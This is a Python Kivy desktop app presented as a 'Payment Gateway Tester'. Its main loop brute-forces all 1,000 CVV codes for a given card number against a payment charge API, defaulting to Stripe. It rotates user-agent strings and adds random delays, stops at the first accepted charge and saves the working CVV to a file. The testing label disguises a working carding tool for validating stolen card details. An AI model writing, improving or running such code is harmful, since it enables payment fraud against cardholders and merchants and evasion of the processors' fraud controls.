from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.core.window import Window
import requests
import threading
import time
import random
import json
import os

Window.clearcolor = (0.1, 0.1, 0.1, 1)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]


class PaymentTester(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", padding=15, spacing=10, **kwargs)
        self.is_running = False

        self.add_widget(
            Label(
                text="[b]Payment Gateway Tester[/b]",
                markup=True,
                font_size=22,
                size_hint_y=None,
                height=50,
            )
        )

        self.add_widget(Label(text="API Endpoint URL:", size_hint_y=None, height=25))
        self.url_input = TextInput(
            text="https://api.stripe.com/v1/charges",
            multiline=False,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.url_input)

        self.add_widget(Label(text="API Secret Key:", size_hint_y=None, height=25))
        self.key_input = TextInput(
            text="sk_test_...",
            multiline=False,
            password=True,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.key_input)

        self.add_widget(Label(text="Test Card Number:", size_hint_y=None, height=25))
        self.card_input = TextInput(
            text="4242424242424242",
            multiline=False,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.card_input)

        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.start_btn = Button(text="Start Test", background_color=(0, 0.7, 0, 1))
        self.start_btn.bind(on_press=self.start_testing)

        self.stop_btn = Button(text="Stop", background_color=(0.7, 0, 0, 1))
        self.stop_btn.bind(on_press=self.stop_testing)

        btn_layout.add_widget(self.start_btn)
        btn_layout.add_widget(self.stop_btn)
        self.add_widget(btn_layout)

        self.scroll = ScrollView(size_hint=(1, 1))
        self.log_label = Label(
            text="Results will appear here...\n",
            size_hint_y=None,
            halign="left",
            valign="top",
            markup=True,
        )
        self.log_label.bind(texture_size=self.log_label.setter("size"))
        self.scroll.add_widget(self.log_label)
        self.add_widget(self.scroll)

    def log_message(self, message, color="white"):
        Clock.schedule_once(lambda dt: self._update_log(message, color))

    def _update_log(self, message, color):
        current_text = self.log_label.text
        if current_text == "Results will appear here...\n":
            current_text = ""
        self.log_label.text = f"{current_text}[color={color}]{message}[/color]\n"

    def start_testing(self, instance):
        if self.is_running:
            return
        self.is_running = True
        self.start_btn.disabled = True
        self.log_message("Starting test process...", "cyan")
        threading.Thread(target=self.run_test, daemon=True).start()

    def stop_testing(self, instance):
        self.is_running = False
        self.log_message("Stop requested...", "orange")

    def run_test(self):
        session = requests.Session()
        url = self.url_input.text.strip()
        key = self.key_input.text.strip()
        card = self.card_input.text.strip()

        for i in range(1000):
            if not self.is_running:
                break

            cvv = f"{i:03d}"
            headers = {
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random.choice(USER_AGENTS),
            }
            payload = {
                "card[number]": card,
                "card[exp_month]": "12",
                "card[exp_year]": "2030",
                "card[cvc]": cvv,
                "amount": "100",
                "currency": "usd",
            }

            try:
                response = session.post(url, data=payload, headers=headers, timeout=10)
                try:
                    resp_json = response.json()
                    resp_str = json.dumps(resp_json)
                except Exception:
                    resp_str = response.text

                if response.status_code == 200 or any(
                    k in resp_str.lower()
                    for k in ["succeeded", "success", "paid", 'cvc_check": "pass']
                ):
                    self.log_message(
                        f"SUCCESS! CVV: {cvv} | Response: {resp_str[:80]}", "lime"
                    )
                    self.save_result(f"SUCCESS - CVV: {cvv} - {resp_str}")
                    self.is_running = False
                    break
                else:
                    self.log_message(
                        f"Failed CVV: {cvv} | Status: {response.status_code}", "red"
                    )
            except Exception as e:
                self.log_message(f"Error on CVV {cvv}: {str(e)[:50]}", "yellow")

            time.sleep(random.uniform(0.5, 1.5))

        if self.is_running:
            self.log_message("Completed all attempts (000-999).", "cyan")
            self.is_running = False

        Clock.schedule_once(lambda dt: setattr(self.start_btn, "disabled", False))

    def save_result(self, text):
        try:
            app = App.get_running_app()
            base_dir = app.user_data_dir if app else "."
            os.makedirs(base_dir, exist_ok=True)
            file_path = os.path.join(base_dir, "results.txt")
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(text + "\n")
            self.log_message(f"Saved result to {file_path}", "lime")
        except Exception as e:
            self.log_message(f"Save failed: {e}", "red")


class MyApp(App):
    def build(self):
        return PaymentTester()


if __name__ == "__main__":
    MyApp().run()
